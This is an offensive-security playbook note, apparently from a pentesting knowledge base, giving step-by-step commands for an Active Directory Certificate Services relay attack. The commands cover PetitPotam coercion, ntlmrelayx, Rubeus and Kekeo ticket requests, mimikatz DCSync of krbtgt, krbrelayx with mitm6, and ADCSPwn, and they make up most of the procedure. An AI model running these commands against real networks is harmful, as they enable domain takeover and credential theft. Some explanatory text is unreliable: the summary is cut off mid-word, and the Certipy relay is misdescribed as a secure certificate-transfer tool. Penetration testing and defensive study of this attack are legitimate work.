---
id: 283f7da1-28e6-4082-a1fa-19c07482b8f2
name: AD CS Relay Attack with Rubeus and PetitPotam
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:06.015482+00:00'
updated_at: '2023-04-10T20:26:16.796211+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Forge Web Credentials|T1606 - Forge Web Credentials]]'
- '[[Pass the Hash|T1075 - Pass the Hash]]'
- '[[Pass the Ticket|T1097 - Pass the Ticket]]'
tags:
- '[[Active Directory Attacks]]'
- '[[Active Directory Certificate Services]]'
- '[[ESC8 - AD CS Relay Attack]]'
commands:
- '[[ADCSPwn relay attack]]'
- '[[Coerce authentication via MS-ESFRPC EfsRpcOpenFileRaw function with petitpotam]]'
- '[[Generate Relay Certificate]]'
- '[[Run mitm6]]'
- '[[Setup the Kerberos Relay]]'
- '[[Use the certificate with rubeus to request a TGT]]'
- '[[Use the TGT to perform a DCSync]]'
---

# AD CS Relay Attack with Rubeus and PetitPotam

## Summary

This attack involves relaying authentication requests to an Active Directory Certificate Services (AD CS) server using the NTLM Relay technique with Rubeus and PetitPotam. The attacker can then acquire a valid certificate from the AD CS server using the compromised user's credentials. This can be u

## Description

# Description

This attack involves relaying authentication requests to an Active Directory Certificate Services (AD CS) server using the NTLM Relay technique with Rubeus and PetitPotam. The attacker can then acquire a valid certificate from the AD CS server using the compromised user's credentials. This can be used to impersonate the user and perform actions such as signing malware or accessing sensitive information encrypted with the user's certificate. This attack can also be used to elevate privileges by acquiring a certificate for a privileged account.

## Requirements

1. Access to a network with an AD CS server

1. NTLM Relay tool such as Rubeus

1. PetitPotam tool

## Defense

1. Implement SMB signing to prevent NTLM Relay attacks

1. Disable NTLM authentication and use Kerberos or LDAP signing instead

1. Monitor for abnormal certificate issuance or usage

## Objectives

1. Acquire a valid certificate from the AD CS server using the compromised user's credentials

1. Impersonate the user and perform actions such as signing malware or accessing sensitive information encrypted with the user's certificate

1. Elevate privileges by acquiring a certificate for a privileged account

# Instructions

1. Follow the below instructions to use NTLM Relay, Rubeus and PetitPotam:
1. Run the command 'python3 ntlmrelayx.py -t http://<ca-server>/certsrv/certfnsh.asp -smb2support --adcs' or 'python3 ./examples/ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs --template VulnTemplate' depending on whether the target is a member server or workstation.
2. Coerce the authentication via MS-ESFRPC EfsRpcOpenFileRaw function with petitpotam by running the command 'python3 petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP' or 'python3 petitpotam.py -d '' -u '' -p '' $ATTACKER_IP $TARGET_IP'.
3. Use the command 'python3 dementor.py <listener> <target> -u <username> -p <password> -d <domain>' or 'python3 dementor.py 10.10.10.250 10.10.10.10 -u user1 -p Password1 -d lab.local' to coerce the authentication via another method like PrintSpooler via MS-RPRN.
4. Use the certificate with Rubeus to request a TGT by running the command 'Rubeus.exe asktgt /user:<user> /certificate:<base64-certificate> /ptt' or 'Rubeus.exe asktgt /user:dc1$ /certificate:MIIRdQIBAzC...mUUXS /ptt'.
5. Finally, use the TGT to perform a DCSync by running the command 'mimikatz> lsadump::dcsync /user:krbtgt'.

**Code**: [[impacket> python3 ntlmrelayx.py -t http://<ca-serv]]

> This command is used to perform NTLM Relay attacks using Rubeus and PetitPotam. The command provides instructions on how to use NTLM Relay, Rubeus and PetitPotam to coerce authentication via MS-ESFRPC EfsRpcOpenFileRaw function and then use the obtained TGT to perform a DCSync. The command also explains the arguments of the commands used and provides examples of the commands.

**Command** ([[Coerce authentication via MS-ESFRPC EfsRpcOpenFileRaw function with petitpotam]]):

```bash
git clone https://github.com/topotam/PetitPotam
python3 petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP
python3 petitpotam.py -d '' -u '' -p '' $ATTACKER_IP $TARGET_IP
```

**Command** ([[Use the certificate with rubeus to request a TGT]]):

```bash
Rubeus.exe asktgt /user:<user> /certificate:<base64-certificate> /ptt
Rubeus.exe asktgt /user:dc1$ /certificate:MIIRdQIBAzC...mUUXS /ptt
```

**Command** ([[Use the TGT to perform a DCSync]]):

```bash
mimikatz> lsadump::dcsync /user:krbtgt
```

2. To acquire domain controller hashes, follow the below steps:
1. Run the following command in Impacket to relay NTLM authentication to the target server:
   python3 ./examples/ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
2. In Mimikatz, execute the following command to establish a connection with the domain controller:
   misc::efs /server:dc.lab.local /connect:<IP> /noauth
3. In Kekeo, execute the following commands to request a TGT ticket:
   base64 /input:on
tgt::ask /pfx:<BASE64-CERT-FROM-NTLMRELAY> /user:dc$ /domain:lab.local /ptt
4. Finally, in Mimikatz, execute the following command to dump domain controller hashes:
   lsadump::dcsync /user:krbtgt

**Code**: [[impacket> python3 ./examples/ntlmrelayx.py -t http]]

> This command is used to acquire domain controller hashes in order to perform further attacks. The steps involve relaying NTLM authentication to the target server, establishing a connection with the domain controller, requesting a TGT ticket and finally dumping domain controller hashes using Mimikatz. The acquired hashes can be used to perform Pass-the-Hash (PtH) attacks.

3. Follow the below instructions to perform a Kerberos Relay Attack with mitm6:

**Code**: [[# Setup the relay
sudo krbrelayx.py --target http:]]

> 1. First, set up the relay by running the following command:

sudo krbrelayx.py --target http://CA/certsrv -ip attacker_IP --victim target.domain.local --adcs --template Machine

This command will set up the relay to target the specified domain and IP address.

2. Once the relay is set up, run mitm6 using the following command:

sudo mitm6 --domain domain.local --host-allowlist target.domain.local --relay CA.domain.local -v

This command will perform the Kerberos Relay Attack and allow the attacker to gain access to the target machine.

**Command** ([[Setup the Kerberos Relay]]):

```bash
sudo krbrelayx.py --target http://CA/certsrv -ip attacker_IP --victim target.domain.local --adcs --template Machine
```

**Command** ([[Run mitm6]]):

```bash
sudo mitm6 --domain domain.local --host-allowlist target.domain.local --relay CA.domain.local -v
```

4. To use ADCSPwn, run the `adcspwn.exe` executable with the appropriate arguments. The `--adcs` argument specifies the address of the AD CS server which authentication will be relayed to. The `--port` argument sets the port ADCSPwn will listen on. The `--remote` argument specifies the remote machine to trigger authentication from. The `--username` and `--password` arguments are used for non-domain context. The `--dc` argument specifies the domain controller to query for Certificate Templates (LDAP). The `--unc` argument sets a custom UNC callback path for EfsRpcOpenFileRaw (Petitpotam). The `--output` argument specifies the output path to store the generated certificate in base64 format.

**Code**: [[https://github.com/bats3c/ADCSPwn
adcspwn.exe --ad]]

> ADCSPwn is a tool for performing an Active Directory Certificate Services (AD CS) relay attack. The tool requires the `WebClient` service to be running on the domain controller, which is not installed by default. The tool is used to relay authentication from a remote machine to the AD CS server. The tool supports several arguments, including specifying the AD CS server address, port, and remote machine to trigger authentication from. The `--username` and `--password` arguments are used for non-domain context. The `--dc` argument specifies the domain controller to query for Certificate Templates (LDAP). The `--unc` argument sets a custom UNC callback path for EfsRpcOpenFileRaw (Petitpotam). The `--output` argument specifies the output path to store the generated certificate in base64 format.

**Command** ([[ADCSPwn relay attack]]):

```bash
adcspwn.exe --adcs <cs server> --port [local port] --remote [computer]
adcspwn.exe --adcs cs.pwnlab.local
adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --port 9001
adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --output C:\Temp\cert_b64.txt
adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --username pwnlab.local\mranderson --password The0nly0ne! --dc dc.pwnlab.local
```

5. To configure Certipy Relay with CA IP address, run the following command:

**Code**: [[certipy relay -ca 172.16.19.100]]

> This command configures the Certipy Relay with the IP address of the Certificate Authority (CA). The -ca argument specifies the IP address of the CA. The Certipy Relay is a tool that allows for the secure transfer of certificates between systems. By configuring it with the CA IP address, it can establish a secure connection with the CA and transfer certificates securely. This command is useful for organizations that need to manage a large number of certificates and need a secure way to transfer them between systems.

**Command** ([[Generate Relay Certificate]]):

```bash
certipy relay -ca 172.16.19.100
```

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]
- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Forge Web Credentials|T1606 - Forge Web Credentials]]
- [[Pass the Hash|T1075 - Pass the Hash]]
- [[Pass the Ticket|T1097 - Pass the Ticket]]

## Commands Used

- [[ADCSPwn relay attack]]
- [[Coerce authentication via MS-ESFRPC EfsRpcOpenFileRaw function with petitpotam]]
- [[Generate Relay Certificate]]
- [[Run mitm6]]
- [[Setup the Kerberos Relay]]
- [[Use the certificate with rubeus to request a TGT]]
- [[Use the TGT to perform a DCSync]]

## Tags

- [[Active Directory Attacks]]
- [[Active Directory Certificate Services]]
- [[ESC8 - AD CS Relay Attack]]
